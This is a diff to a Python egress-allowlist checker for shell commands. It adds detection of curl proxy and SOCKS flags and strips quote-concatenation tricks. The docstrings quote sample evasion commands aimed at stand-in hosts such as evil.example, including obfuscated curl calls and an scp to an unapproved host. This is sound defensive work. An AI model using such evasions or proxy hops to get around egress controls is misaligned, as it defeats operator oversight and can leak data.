@@ -170,6 +170,13 @@ _URL_SCHEMES = frozenset({"http", "https", "ftp", "sftp", "ssh", "file", "git"})
 _CURL_DEST_OVERRIDE = re.compile(
     r"(?:^|[\s])(?:--resolve|--connect-to)(?:=|\s+)\+?(\S+)"
 )
+# curl proxy / SOCKS flags send traffic to a different host than the URL.
+# Long options require '=' or whitespace so `--proxy-user` is not a proxy dest.
+_CURL_PROXY_LONG = re.compile(
+    r"(?:^|[\s])(?:--proxy|--proxy1\.0|--preproxy|--socks4a?|--socks5(?:-hostname)?)"
+    r"(?:=|\s+)\+?(\S+)"
+)
+_CURL_PROXY_SHORT = re.compile(r"(?:^|[\s])-x\s*(\S+)")
 
 
 def _mode() -> str:
@@ -191,13 +198,16 @@ def _egress_allowlist() -> list[str]:
 
 
 def _unescape_cmd_escapes(cmd: str) -> str:
-    """Collapse bash backslash-escapes so ``c\\url`` is inspected as ``curl``.
+    """Normalize bash spelling tricks so ``c\\url`` / ``c"url"`` inspect as ``curl``.
 
-    Bash removes these before execution; matching the raw string would miss
-    command-name evasion such as ``c\\url https://evil.example``. Quote
-    concatenation and ANSI-C escapes are out of scope.
+    Bash removes backslash escapes and concatenates quoted fragments before
+    execution; matching the raw string would miss command-name evasion such as
+    ``c\\url https://evil.example`` or ``c"url" https://evil.example``. ANSI-C
+    quotes (``$'curl'``), ``eval``, and aliases remain out of scope — this is
+    a heuristic, not a shell parser.
     """
-    return re.sub(r"\\(.)", r"\1", cmd)
+    cmd = re.sub(r"\\(.)", r"\1", cmd)
+    return cmd.replace('"', "").replace("'", "")
 
 
 def _check_shell_policy(cmd: str) -> str | None:
@@ -313,6 +323,36 @@ def _curl_override_hosts(cmd: str) -> tuple[list[str], bool]:
     return hosts, unparsed
 
 
+def _host_from_proxy_spec(spec: str) -> str | None:
+    """Extract the hostname from a curl ``-x`` / ``--proxy`` / SOCKS argument."""
+    spec = spec.strip("\"'")
+    if not spec or spec.startswith("-"):
+        return None
+    parsed = urlparse(spec if "://" in spec else f"//{spec}")
+    if parsed.hostname:
+        return parsed.hostname
+    host = spec.split("/")[0].rsplit("@", 1)[-1]
+    if host.startswith("[") and "]" in host:
+        return host[1 : host.index("]")]
+    host = host.split(":")[0]
+    return host or None
+
+
+def _curl_proxy_hosts(cmd: str) -> tuple[list[str], bool]:
+    """Return (proxy destinations, had_unparsed_proxy) from curl proxy/SOCKS flags."""
+    hosts: list[str] = []
+    unparsed = False
+    specs = [m.group(1) for m in _CURL_PROXY_LONG.finditer(cmd)]
+    specs.extend(m.group(1) for m in _CURL_PROXY_SHORT.finditer(cmd))
+    for spec in specs:
+        host = _host_from_proxy_spec(spec)
+        if host:
+            hosts.append(host)
+        else:
+            unparsed = True
+    return hosts, unparsed
+
+
 def _check_egress(cmd: str, allowlist: list[str]) -> str | None:
     """Return reason string for non-allowlisted egress in *cmd*, else ``None``.
 
@@ -322,8 +362,8 @@ def _check_egress(cmd: str, allowlist: list[str]) -> str | None:
 
     Mixed commands such as ``curl https://allowlisted.example && scp file evil:``
     must not be approved just because the HTTP host is allowlisted.
-    Curl ``--resolve`` / ``--connect-to`` destination overrides are checked
-    independently of the URL hostname.
+    Curl ``--resolve`` / ``--connect-to`` destination overrides and
+    ``-x`` / ``--proxy`` / SOCKS hops are checked independently of the URL hostname.
     """
     if not allowlist:
         return None  # egress check inactive — no allowlist configured
@@ -333,9 +373,12 @@ def _check_egress(cmd: str, allowlist: list[str]) -> str | None:
     http_hosts = _http_hosts(cmd)
     other_hosts = _non_http_hosts(cmd)
     override_hosts, unparsed_override = _curl_override_hosts(cmd)
+    proxy_hosts, unparsed_proxy = _curl_proxy_hosts(cmd)
     if unparsed_override:
         return "network command with unparsed destination override (allowlist active)"
-    hosts = http_hosts + other_hosts + override_hosts
+    if unparsed_proxy:
+        return "network command with unparsed proxy destination (allowlist active)"
+    hosts = http_hosts + other_hosts + override_hosts + proxy_hosts
     if _NON_HTTP_EGRESS.search(cmd) and not other_hosts:
         return "network command with unparsed non-HTTP destination (allowlist active)"
     if not hosts:
